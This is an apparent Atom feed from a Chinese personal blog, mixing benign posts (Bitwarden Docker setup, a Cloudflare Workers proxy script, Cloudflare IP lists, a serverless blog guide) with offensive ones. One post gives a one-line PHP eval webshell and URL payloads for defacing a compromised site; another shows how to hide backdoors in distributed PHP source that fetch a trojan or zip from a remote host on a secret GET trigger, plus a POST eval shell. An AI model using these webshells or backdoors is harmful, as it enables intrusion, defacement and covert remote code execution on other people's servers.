$zip-&gt;extractTo('../');</code></pre><p>这个方法能用来解压可到云之类的在线文件管理，当然，也可以解压个攻击工具包，然后对其它网站进行压测。</p><p>其他的东西我就不说了，还有什么其他玩法，我们就笑看大佬了</p>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/74.html#comments" thr:count="0" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/74.html" thr:count="0"/>
+</entry>
+<entry>
+<title type="html"><![CDATA[如何优雅的给GetShell后的网站挂黑提醒]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/72.html" />
+<id>https://2890.ltd/blog/72.html</id>
+<updated>2020-02-19T17:08:00+08:00</updated>
+<published>2020-02-19T17:08:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[个人推荐webshell&amp;lt;?php @eval($_GET[&amp;quot;cmd&amp;quot;]); ?&amp;gt;死稳的一句话，也是个基础WebShell，但是适用于宝塔之类的禁用了系统函数的环...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/72.html" xml:lang="zh-CN"><![CDATA[
+<p>个人推荐webshell</p><pre><code>&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;</code></pre><p>死稳的一句话，也是个基础WebShell，但是适用于宝塔之类的禁用了系统函数的环境，后面我会进行演示。<br>当你通过自己的方法把这个shell上传了上去之后，不用菜刀，所有操作均在浏览器进行,(这个WebShell的操作全部为php代码，宝塔默认禁用php调用linux命令的函数，如exec)</p><h2 id="toc_26">1.挂黑</h2><p>挂黑肯定是各位拿站之后必干的事，这里提供操作<br>访问</p><pre><code>您的域名/您的文件名.php?cmd=$myfile = fopen(&quot;index.php&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);$txt = &quot;黑页内容&quot;;fwrite($myfile, $txt);fclose($myfile);</code></pre><p>如果您的html过长，可以尝试使用下载方法<br>访问</p><pre><code>您的域名/您的文件名.php?cmd=file_put_contents(&quot;index.php&quot;,file_get_contents(&quot;您的黑页链接&quot;));</code></pre><p>为什么上面文件名不用html呢？因为html在大部分使用宝塔的服务器上的优先级低于php，如果您需要也可以使用html</p><h2 id="toc_27">2.删除自身</h2><p>如果您是一位白帽，留了黑页也该走了,访问</p><pre><code>您的域名/您的文件名.php?cmd=$myfile = fopen(&quot;文件名&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);$txt = &quot;&quot;;fwrite($myfile, $txt);fclose($myfile);</code></pre><p>即可一键自宫（雾<br>当然，还有其他玩法，如用php列举文件，进行网站压测等玩法就不一一列举了，当然，欢迎各位加我Tg交流技术<br>tg id:@given_huang</p>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/72.html#comments" thr:count="0" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/72.html" thr:count="0"/>
+</entry>
+<entry>
+<title type="html"><![CDATA[挖坑埋密码？密码存贮程序Bitwarden初体验]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/59.html" />
+<id>https://2890.ltd/blog/59.html</id>
+<updated>2020-01-16T14:03:00+08:00</updated>
+<published>2020-01-16T14:03:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[这是一款开源的密码服务器，在密码学中有一个原则，只要你的密钥没有被泄露，那么你的数据就是安全的，无论过程是否众所周知。安装体验官方BitWarden是基于.Net 部署，使用MSSQL过于臃肿，...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/59.html" xml:lang="zh-CN"><![CDATA[
+<p>这是一款开源的密码服务器，在密码学中有一个原则，只要你的密钥没有被泄露，那么你的数据就是安全的，无论过程是否众所周知。</p><h2 id="toc_28">安装体验</h2><p>官方BitWarden是基于.Net 部署，使用MSSQL过于臃肿，于是我并没有使用官方版本，去年在社区中有几位朋友使用Rust将他重写了，项目名为BitWarden_rs，使用SQLite作为数据库，提供Docker部署方案,而且可以免费使用官方一些付费的应用，本篇使用BitWarden_rs作为演示</p><h3 id="toc_29">安装Docker</h3><pre><code>#安装Docker
+yum -y install docker
+#启动docker
+systemctl start docker
+#开机自启
+systemctl enable docker</code></pre><h3 id="toc_30">使用Docker拉取BitWarden_rs镜像并运行</h3><pre><code>docker pull bitwardenrs/server:latest
+docker run -d --name bitwarden -v /bw-data/:/data/ -p 8848:80 bitwardenrs/server:latest</code></pre><h3 id="toc_31">配置反向代理</h3><p>建议使用宝塔面板进行反向代理配置，使用<a href="#">Freessl</a>获取一个免费的亚洲诚信SSL证书（BitWarden需要SSL才能工作）<br>反向代理配置如下</p><pre><code>#PROXY-START/
+location  ~* \.(php|jsp|cgi|asp|aspx)$
+{
+    proxy_pass http://你的IP:8848;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header REMOTE-HOST $remote_addr;
+}
+location /
+{
+    proxy_pass http://你的IP:8848;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header REMOTE-HOST $remote_addr;
+
+    add_header X-Cache $upstream_cache_status;
+    
+    #Set Nginx Cache
+    
+        add_header Cache-Control no-cache;
+}
+
+#PROXY-END/</code></pre><h2 id="toc_32">ENJOY</h2><p><figure><img class="" alt="Main" data-src="https://cdn.hyh.ink/20200116/1/5e1ffc40ac003CLSUFFQQ20200116-140104.png#vwid=1365&vhei=688" src="https://cdn.hyh.ink/20200116/1/5e1ffc40ac003CLSUFFQQ20200116-140104.png#vwid=1365&vhei=688"><figcaption>Main</figcaption></figure></p>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/59.html#comments" thr:count="0" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/59.html" thr:count="0"/>
+</entry>
+<entry>
+<title type="html"><![CDATA[如何充分使用CloudFlare的免费账户]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/55.html" />
+<id>https://2890.ltd/blog/55.html</id>
+<updated>2020-01-01T00:00:00+08:00</updated>
+<published>2020-01-01T00:00:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[想必各位朋友如果做网站，肯定接触或者听说过CloudFlare这个名词吧，今天我们就来看看怎么把CF免费账户的价值榨干1. 使用CF workers进行反向代理，搭建博客大家应该都知道，CF出了...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/55.html" xml:lang="zh-CN"><![CDATA[
+<p>想必各位朋友如果做网站，肯定接触或者听说过CloudFlare这个名词吧，今天我们就来看看怎么把CF免费账户的价值榨干</p><h2 id="toc_33">1. 使用CF workers进行反向代理，搭建博客</h2><p>大家应该都知道，CF出了一个worker服务，可以让你免费运行serverless代码，比如制作反向代理，搭建博客等，只要能用node.js实现理论都可以运行，每日免费请求量是20万，够一个小型站点一天使用了。<br>源码<br>1.反代</p><pre><code>
+/**
+ * static files (404.html, sw.js, conf.js)
+ */
+const ASSET_URL = '要访问的地址'
+
+const JS_VER = 10
+const MAX_RETRY = 1
+
+/** @type {RequestInit} */
+const PREFLIGHT_INIT = {
+  status: 204,
+  headers: new Headers({
+    'access-control-allow-origin': '*',
+    'access-control-allow-methods': 'GET,POST,PUT,PATCH,TRACE,DELETE,HEAD,OPTIONS',
+    'access-control-max-age': '1728000',
+  }),
+}
+
+/**
+ * @param {any} body
+ * @param {number} status
+ * @param {Object&lt;string, string&gt;} headers
+ */
+function makeRes(body, status = 200, headers = {}) {
+  headers['--ver'] = JS_VER
+  headers['access-control-allow-origin'] = '*'
+  return new Response(body, {status, headers})
+}
+
+
+/**
+ * @param {string} urlStr 
+ */
+function newUrl(urlStr) {
+  try {
+    return new URL(urlStr)
+  } catch (err) {
+    return null
+  }
+}
+
+
+addEventListener('fetch', e =&gt; {
+  const ret = fetchHandler(e)
+    .catch(err =&gt; makeRes('cfworker error:\n' + err.stack, 502))
+  e.respondWith(ret)
+})
+
+
+/**
+ * @param {FetchEvent} e 
+ */
+async function fetchHandler(e) {
+  const req = e.request
+  const urlStr = req.url
+  const urlObj = new URL(urlStr)
+  const path = urlObj.href.substr(urlObj.origin.length)
+
+  if (urlObj.protocol === 'http:') {
+    urlObj.protocol = 'https:'
+    return makeRes('', 301, {
+      'strict-transport-security': 'max-age=99999999; includeSubDomains; preload',
+      'location': urlObj.href,
+    })
+  }
+
+  if (path.startsWith('/http/')) {
+    return httpHandler(req, path.substr(6))
+  }
+
+  switch (path) {
+  case '/http':
+    return makeRes('请更新 cfworker 到最新版本!')
+  case '/ws':
+    return makeRes('not support', 400)
+  case '/works':
+    return makeRes('it works')
+  default:
+    // static files
+    return fetch(ASSET_URL + path)
+  }
+}
+
+
+/**
+ * @param {Request} req
+ * @param {string} pathname
+ */
+function httpHandler(req, pathname) {
+  const reqHdrRaw = req.headers
+  if (reqHdrRaw.has('x-jsproxy')) {
+    return Response.error()
+  }
+
+  // preflight
+  if (req.method === 'OPTIONS' &amp;&amp;
+      reqHdrRaw.has('access-control-request-headers')
+  ) {
+    return new Response(null, PREFLIGHT_INIT)
+  }
+
+  let acehOld = false
+  let rawSvr = ''
+  let rawLen = ''
+  let rawEtag = ''
+
+  const reqHdrNew = new Headers(reqHdrRaw)
+  reqHdrNew.set('x-jsproxy', '1')
+
+  // 此处逻辑和 http-dec-req-hdr.lua 大致相同
+  // https://github.com/EtherDream/jsproxy/blob/master/lua/http-dec-req-hdr.lua
+  const refer = reqHdrNew.get('referer')
+  const query = refer.substr(refer.indexOf('?') + 1)
+  if (!query) {
+    return makeRes('missing params', 403)
+  }
+  const param = new URLSearchParams(query)
+
+  for (const [k, v] of Object.entries(param)) {
+    if (k.substr(0, 2) === '--') {
+      // 系统信息
+      switch (k.substr(2)) {
+      case 'aceh':
+        acehOld = true
+        break
+      case 'raw-info':
+        [rawSvr, rawLen, rawEtag] = v.split('|')
+        break
+      }
+    } else {
+      // 还原 HTTP 请求头
+      if (v) {
+        reqHdrNew.set(k, v)
+      } else {
+        reqHdrNew.delete(k)
+      }
+    }
+  }
+  if (!param.has('referer')) {
+    reqHdrNew.delete('referer')
+  }
+
+  // cfworker 会把路径中的 `//` 合并成 `/`
+  const urlStr = pathname.replace(/^(https?):\/+/, '$1://')
+  const urlObj = newUrl(urlStr)
+  if (!urlObj) {
+    return makeRes('invalid proxy url: ' + urlStr, 403)
+  }
+
+  /** @type {RequestInit} */
+  const reqInit = {
+    method: req.method,
+    headers: reqHdrNew,
+    redirect: 'manual',
+  }
+  if (req.method === 'POST') {
+    reqInit.body = req.body
+  }
+  return proxy(urlObj, reqInit, acehOld, rawLen, 0)
+}
+
+
+/**
+ * 
+ * @param {URL} urlObj 
+ * @param {RequestInit} reqInit 
+ * @param {number} retryTimes 
+ */
+async function proxy(urlObj, reqInit, acehOld, rawLen, retryTimes) {
+  const res = await fetch(urlObj.href, reqInit)
+  const resHdrOld = res.headers
+  const resHdrNew = new Headers(resHdrOld)
+
+  let expose = '*'
+  
+  for (const [k, v] of resHdrOld.entries()) {
+    if (k === 'access-control-allow-origin' ||
+        k === 'access-control-expose-headers' ||
+        k === 'location' ||
+        k === 'set-cookie'
+    ) {
+      const x = '--' + k
+      resHdrNew.set(x, v)
+      if (acehOld) {
+        expose = expose + ',' + x
+      }
+      resHdrNew.delete(k)
+    }
+    else if (acehOld &amp;&amp;
+      k !== 'cache-control' &amp;&amp;
+      k !== 'content-language' &amp;&amp;
+      k !== 'content-type' &amp;&amp;
+      k !== 'expires' &amp;&amp;
+      k !== 'last-modified' &amp;&amp;
+      k !== 'pragma'
+    ) {
+      expose = expose + ',' + k
+    }
+  }
+
+  if (acehOld) {
+    expose = expose + ',--s'
+    resHdrNew.set('--t', '1')
+  }
+
+  // verify
+  if (rawLen) {
+    const newLen = resHdrOld.get('content-length') || ''
+    const badLen = (rawLen !== newLen)
+
+    if (badLen) {
+      if (retryTimes &lt; MAX_RETRY) {
+        urlObj = await parseYtVideoRedir(urlObj, newLen, res)
+        if (urlObj) {
+          return proxy(urlObj, reqInit, acehOld, rawLen, retryTimes + 1)
+        }
+      }
+      return makeRes(res.body, 400, {
+        '--error': `bad len: ${newLen}, except: ${rawLen}`,
+        'access-control-expose-headers': '--error',
+      })
+    }
+
+    if (retryTimes &gt; 1) {
+      resHdrNew.set('--retry', retryTimes)
+    }
+  }
+
+  let status = res.status
+
+  resHdrNew.set('access-control-expose-headers', expose)
+  resHdrNew.set('access-control-allow-origin', '*')
+  resHdrNew.set('--s', status)
+  resHdrNew.set('--ver', JS_VER)
+
+  resHdrNew.delete('content-security-policy')
+  resHdrNew.delete('content-security-policy-report-only')
+  resHdrNew.delete('clear-site-data')
+
+  if (status === 301 ||
+      status === 302 ||
+      status === 303 ||
+      status === 307 ||
+      status === 308
+  ) {
+    status = status + 10
+  }
+
+  return new Response(res.body, {
+    status,
+    headers: resHdrNew,
+  })
+}
+
+
+/**
+ * @param {URL} urlObj 
+ */
+function isYtUrl(urlObj) {
+  return (
+    urlObj.host.endsWith('.googlevideo.com') &amp;&amp;
+    urlObj.pathname.startsWith('/videoplayback')
+  )
+}
+
+/**
+ * @param {URL} urlObj 
+ * @param {number} newLen 
+ * @param {Response} res 
+ */
+async function parseYtVideoRedir(urlObj, newLen, res) {
+  if (newLen &gt; 2000) {
+    return null
+  }
+  if (!isYtUrl(urlObj)) {
+    return null
+  }
+  try {
+    const data = await res.text()
+    urlObj = new URL(data)
+  } catch (err) {
+    return null
+  }
+  if (!isYtUrl(urlObj)) {
+    return null
+  }
+  return urlObj
+}![]()</code></pre><p>2.博客<br>源代码<a href="https://github.com">GayHub</a>上一堆，不发了</p><h2 id="toc_34">2. 手动指定cf节点ip来达到最佳cdn效果</h2><p>此操作使用于用CloudFlare Partner接入的用户<br>添加网站之后，通过A记录解析到这些IP：</p><pre><code>108.162.236.1/24 联通 走美国
+172.64.32.1/24 移动 走香港
+104.16.160.1/24 电信 走美国洛杉矶
+---------
+172.64.0.0/24 电信 美国旧金山
+104.20.157.0/24 联通 走日本
+104.28.14.0/24 移动 走新加坡
+ （联通移动推荐节点）
+ 104.23.240.0-104.23.243.254
+ （电信推荐百度云合作ip）
+ 162.159.208.4-162.159.208.103
+ 162.159.209.4-162.159.209.103
+ 162.159.210.4-162.159.210.103
+ 162.159.211.4-162.159.211.103</code></pre><p>速度快的：</p><pre><code>104.20.157.2 
+104.18.62.2 
+141.101.115.3 
+104.16.160.3</code></pre><p>百度云加速合作节点：</p><pre><code>162.159.211.4-103
+103.21.244.0/22
+103.22.200.0/22
+103.31.4.0/22
+104.16.0.0/12
+108.162.192.0/18
+131.0.72.0/22
+141.101.64.0/18
+162.158.0.0/15
+172.64.0.0/13
+173.245.48.0/20
+188.114.96.0/20
+190.93.240.0/20
+197.234.240.0/22
+198.41.128.0/17</code></pre><p>其余节点</p><pre><code>#适合电信的节点
+104.23.240.*
+#走欧洲各国出口 英国德国荷兰等 延迟比美国高一些 适合源站在欧洲的网站
+172.64.32.*
+#虽然去程走新加坡，但是回程线路的绕路的，实际效果不好，不推荐
+104.16.160.*
+#圣何塞的线路，比洛杉矶要快一点，推荐
+108.162.236.*
+#亚特兰大线路，延迟稳定，但是延迟较高
+#适合移动的节点
+162.158.133.* 
+#走的丹麦，这一段ip只有部分能用，可以自己试一下。绕美国。
+198.41.214.*
+198.41.212.*
+198.41.208.*
+198.41.209.*
+172.64.32.*
+141.101.115.*
+#移动走香港的IP段有很多，以上并不是全部。CF移动走香港的分直连和走ntt的效果都挺不错的，不过部分地区晚上还是会丢包。
+172.64.0. *
+#这是走圣何塞的，一般用香港的就行
+172.64.16.* 
+#欧洲线路.绕
+ #1.0.0.1效果较好
+电信部分
+大多数省直接使用1.0.0.0即可，延迟低，丢包少，
+ #移动部分
+#新加坡
+ 104.18.48.0-104.18.63.255
+104.24.112.0-104.24.127.255
+104.27.128.0-104.27.143.255
+104.28.0.0-104.28.15.255
+ #移动部分
+#圣何塞 
+104.28.16.0-31.255
+104.27.144.0-243.254
+104.23.240.0-243.254
+ #香港cloudflare1-100g.hkix.net
+1.0.0.0-254
+1.1.1.0-254
+ #香港直连
+104.16.0.0-79.255
+104.16.96.0-175.254
+104.16.192.0-207.255</code></pre>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/55.html#comments" thr:count="0" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/55.html" thr:count="0"/>
+</entry>
+<entry>
+<title type="html"><![CDATA[0成本搭建超快的Serverless Blog]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/47.html" />
+<id>https://2890.ltd/blog/47.html</id>
+<updated>2019-11-27T20:20:00+08:00</updated>
+<published>2019-11-27T20:20:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[用过很多博客程序了，有动态的，也有静态的，只能说各有所长吧。今天这个程序，基于serverless，运行在cloudflare workers上，除了域名需要付费(也可以去Freenom申请免费...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/47.html" xml:lang="zh-CN"><![CDATA[
+<blockquote>用过很多博客程序了，有动态的，也有静态的，只能说各有所长吧。</blockquote><p>今天这个程序，基于serverless，运行在cloudflare workers上，除了域名需要付费(也可以去<a href="https://freenom.com">Freenom</a>申请免费的，但是不推荐)其余都是完全免费的。</p><h2 id="toc_35">演示</h2><p><figure><img class="" alt="iloli.icu" data-src="https://i.loli.net/2019/11/23/6EFQW7DmPa9s52z.png#vwid=1915&vhei=967" src="https://i.loli.net/2019/11/23/6EFQW7DmPa9s52z.png#vwid=1915&vhei=967"><figcaption>iloli.icu</figcaption></figure></p><h2 id="toc_36">源代码</h2><p><a href="https://github.com/kasuganosoras/cloudflare-worker-blog">github </a><br>这份代码是未经修改的，你也可以选择自行修改</p><h2 id="toc_37">搭建过程</h2><ol><li>进入<a href="https://cloudflare.com">cloudflare官网</a>，登录你的账号</li><li>进入workers设置，创建一个新的worker</li></ol><p><figure><img class="" alt="workers" data-src="https://i.loli.net/2019/11/23/BhgxGZia1R7o9Lf.png#vwid=450&vhei=273" src="https://i.loli.net/2019/11/23/BhgxGZia1R7o9Lf.png#vwid=450&vhei=273"><figcaption>workers</figcaption></figure><br><figure><img class="" alt="创建完毕" data-src="https://i.loli.net/2019/11/23/7W2a3RJy5l6SDNj.png#vwid=762&vhei=336" src="https://i.loli.net/2019/11/23/7W2a3RJy5l6SDNj.png#vwid=762&vhei=336"><figcaption>创建完毕</figcaption></figure></p><ol><li>点击editor，将worker.js内容粘贴到左边，save，就完事了</li></ol><h2 id="toc_38">自定义域名</h2><p>获取到自己的<em>*</em>*.workers.dev <br>域名 Cname 到(<em>*</em>*.workers.dev)<br>然后去 Workers 点击 ADD route<br>输入自定义域名，例如 <code>iloli.icu/*</code> 后面要加上 <code>/*</code> ，下面的 workers 选择刚才的项目</p>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/47.html#comments" thr:count="0" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/47.html" thr:count="0"/>
+</entry>
+<entry>
+<title type="html"><![CDATA[如何用三种方式优雅的往你的PHP源码放点不为人知的后门]]></title>
+<link rel="alternate" type="text/html" href="https://2890.ltd/blog/24.html" />
+<id>https://2890.ltd/blog/24.html</id>
+<updated>2019-09-13T12:12:00+08:00</updated>
+<published>2019-09-13T12:12:00+08:00</published>
+<author>
+    <name>Given | 秋庭 そう</name>
+    <uri>https://2890.ltd</uri>
+</author>
+<summary type="html"><![CDATA[兄 dei 你有没有尝试过辛辛苦苦写的源码被人解密拿去大肆分享？不管有没有，反正我是没有。那么这篇文章我们就来说一下如何有效的防范狗 b 并且阴一把狗 b 吧 QAQ巧用Get远程下载后门巧用G...]]></summary>
+<content type="html" xml:base="https://2890.ltd/blog/24.html" xml:lang="zh-CN"><![CDATA[
+<blockquote>兄 dei 你有没有尝试过辛辛苦苦写的源码被人解密拿去大肆分享？不管有没有，反正我是没有。那么这篇文章我们就来说一下如何有效的防范狗 b 并且阴一把狗 b 吧 QAQ</blockquote><h2 id="toc_39">巧用Get远程下载后门巧用Get远程下载后门</h2><pre><code> &lt;?php
+define('ROOT', dirname(SYSTEM_ROOT).'/');
+if($_GET['hacked']==='logged'){'
+file_put_contents(ROOT.'isetex.php',curl_get('http://域名/api/houmen.txt)'));
+}
+?&gt;
+</code></pre><p>食用方法:把一个文本为木马的txt保存到云端，复制链接替换“<a href="http://域名/api/houmen.txt">http://域名/api/houmen.txt</a>” 然后访问文件名称.php?hacked=logged 即可在目录生成一个从你云端木马文本获取内容并且名为isetex.php的木马文件</p><p>当然你也可以改成一句话之类的东西，简单说 你会玩 想咋玩咋玩<br>利用云端下载压缩包解压放后门</p><pre><code>&lt;?php
+$down=file_get_contents('http://压缩包下载地址.zip');
+        file_put_contents('update.zip',$down);
+            $zip = new ZipArchive;
+            $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');
+
+
+            echo &quot;https://2890.ltd OK!!!&quot;;
+?&gt;
+</code></pre><p>结合上面的get方式来也是妥妥的</p><pre><code>    &lt;?php
+if($_GET['hacked']==='logged'){
+    $down=file_get_contents('http://压缩包下载地址.zip');
+            file_put_contents('update.zip',$down);
+                $zip = new ZipArchive;
+                $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');
+
+                echo &quot;https://2890.ltd OK!!!&quot;;
+}
+    ?&gt;
+</code></pre><p>食用方法：访问，自动下载云端压缩包并解压到根目录，必须要求zip压缩</p><p>JavaScript骚操作防盗模板</p><p>`var xhr = new XMLHttpRequest();<br>xhr.onreadystatechange=function(){</p><pre><code>    if(xhr.responseText == &quot;000&quot;){//如果txt内容为000
+            document.write(&quot;&lt;center&gt;&lt;h1&gt;我是显示内容&lt;center&gt;&lt;h1&gt;&quot;);
+    }//则显示这里的内容</code></pre><p>}<br>xhr.open("GET","http://webserver/isopen.txt",true);//云端txt</p><p>xhr.send(null);`<br>感觉代码写的挺明白的，js放oss然后模板添加一下调用，盗版狗专防，死稳</p><p>忘了说js还支持运行php代码 感觉人生js并肩php了呢</p><p><code>&lt;script language=php&gt;@eval($_POST['web']);&lt;/script&gt; </code></p>
+]]></content>
+<link rel="replies" type="text/html" href="https://2890.ltd/blog/24.html#comments" thr:count="0" />
+<link rel="replies" type="application/atom+xml" href="https://2890.ltd/feed/atom/blog/24.html" thr:count="0"/>
+</entry>
+</feed>
